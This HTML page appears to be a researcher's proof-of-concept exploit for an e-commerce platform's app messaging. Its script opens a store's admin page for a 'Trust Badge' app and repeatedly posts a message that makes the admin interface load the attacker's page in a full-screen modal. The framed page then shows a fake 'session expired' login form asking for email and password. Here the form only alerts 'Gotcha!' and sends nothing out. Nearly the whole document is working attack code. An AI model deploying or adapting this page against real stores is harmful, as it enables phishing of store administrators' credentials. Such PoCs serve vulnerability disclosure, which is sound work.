<html>
<head>
  <meta charset="utf-8">
  <title>Exploiting app communication</title>
  <script>
    window.onload = function()
    {
      if (window.location.origin != "https://dehektorcommerce.com")
      {
        window.location.href = "https://dehektorcommerce.com" + window.location.pathname;
        return;
      }

      if (window.top == window)
      {
        var form = document.getElementById("form");
        form.removeAttribute("hidden");
        form.addEventListener("submit", function(event)
        {
          event.preventDefault();

          var host = document.getElementById("host").value.replace(/^\w+:\/*/, "");
          var wnd = window.open("https://" + host + "/admin/apps/trust-badge/", "_blank");
          var interval = window.setInterval(function()
          {
            wnd.postMessage(JSON.stringify({
              message: "Service.API.Modal.open",
              data: {
                hideHeader: true,
                src: window.location.href,
                fullScreen: true
              }
            }), "https://" + host);
          }, 500);
          window.addEventListener("message", function(event)
          {
            if (event.origin == window.location.origin)
              window.clearTimeout(interval);
          }, false);
        });
        document.getElementById("host").focus();
      }
      else
      {
        if (window.top.opener)
          window.top.opener.postMessage("", window.location.origin);
        var form = document.getElementById("login");
        form.removeAttribute("hidden");
        form.addEventListener("submit", function(event)
        {
          event.preventDefault();
          alert("Gotcha!");
        });
      }
    };
  </script>
</head>
<body>
  <form id="form" hidden>
    <p>Which service should we exploit? You have to be an admin, and the <a href="https://apps.service.com/trust-badge">Trust Badge</a> app needs to be installed.</p>
    <p>
      <input size="40" id="host" placeholder="foo.myservice.com">
    </p>
    <p>
      <button type="submit">Do it!</button>
    </p>
  </form>

  <form id="login" hidden style="width: 340px; margin: auto;">
    <p>Your session has expired</p>
    <p>Log in to manage your store</p>
    <div>
      <input id="email" name="login" placeholder="Email" type="email">
    </div>
    <div>
      <input id="password" name="password" placeholder="Password" type="password">
    </div>
    <p>
      <button type="submit">Log in</button>
    </p>
  </form>
</body>
</html>
